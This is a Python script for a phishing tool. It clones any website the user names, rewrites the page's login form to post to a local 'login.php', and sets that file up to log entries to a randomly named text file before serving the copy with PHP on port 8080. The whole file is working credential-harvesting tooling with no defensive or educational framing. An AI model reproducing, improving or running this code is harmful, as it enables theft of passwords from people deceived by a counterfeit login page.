import requests
import os
import random
import string
from bs4 import BeautifulSoup

url = ""
form_action = ""
form_action_second = ""
str_line_second = ""
str_line = ""
lenght = ""

def cloning():
    index_file = open("./HTTPServer/index.html", "w")
    global url
    url = input("[?] URL_WEBSITE : ")
    print("[~] Cloning Website ...")
    response = requests.get(url)
    element = BeautifulSoup(response.text, "html.parser")
    content = str(element)
    index_file.write(content)
    index_file.close()
    ori_content = open("./HTTPServer/index.html", "r+")
    for line in ori_content:
        if "<form action=" in line:
            global str_line
            str_line = line
            global lenght
            lenght = str_line.__len__()
        def form_action_label():
            global str_line
            if str_line.__len__() > 200:
                line_len_start_second = str_line.find('<form action="')
                line_len_end_second = str_line.find('method="post"')
                line_second = str_line[line_len_start_second:line_len_end_second]
                global str_line_second
                str_line_second = str(line_second)
                form_len_start_second = str_line_second.find('"', 13)
                form_len_end_second = str_line_second.find(' ', 15)
                global form_action_second
                form_action_second = str_line_second[form_len_start_second:form_len_end_second]
            else:
                form_len_start = str_line.find('"', 13)
                form_len_end = str_line.find(' ', 15)
                global form_action
                form_action = str_line[form_len_start:form_len_end]
        form_action_label()

    s = open("./HTTPServer/index.html").read()
    if form_action.__len__() > str_line_second.__len__():
        replace = s.replace(form_action, '"login.php"')
    else:
        replace = s.replace(form_action_second, '"login.php"')
    f = open("./HTTPServer/index.html", "w")
    f.write(replace)
    f.close()
    print("[+] Saved in ./HTTPServer/index.html")
cloning()

def randomString(stringLength = 10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
pw_name = randomString(6)

def server():
    f_pw = open("%s.txt" %pw_name, "w")
    f_pw.close()
    s = open("./HTTPServer/login.php").read()
    os.system("rm ./HTTPServer/login.php")
    pw_replace = s.replace("password", pw_name)
    f_password = open("./HTTPServer/login.php", "w")
    f_password.write(pw_replace)
    f_password.close()
    global url
    url_replace = pw_replace.replace("URL", url)
    f_url = open("./HTTPServer/login.php", "w")
    f_url.write(url_replace)
    f_url.close()

    print("[+] Server Running On Port ==> 127.0.0.1:8080")
    os.system("cd ./HTTPServer && php -S 127.0.0.1:8080")
server()

def flogin_return():
    s = open("./HTTPServer/login.php").read()
    f_undo = open("./HTTPServer/login.php", "w")
    pw_replace = s.replace(pw_name, "password")
    f_undo.write(pw_replace)
    f_undo.close()

    global url
    url_replace = pw_replace.replace(url, "URL")
    f_url = open("./HTTPServer/login.php", "w")
    f_url.write(url_replace)
    f_url.close()
flogin_return()
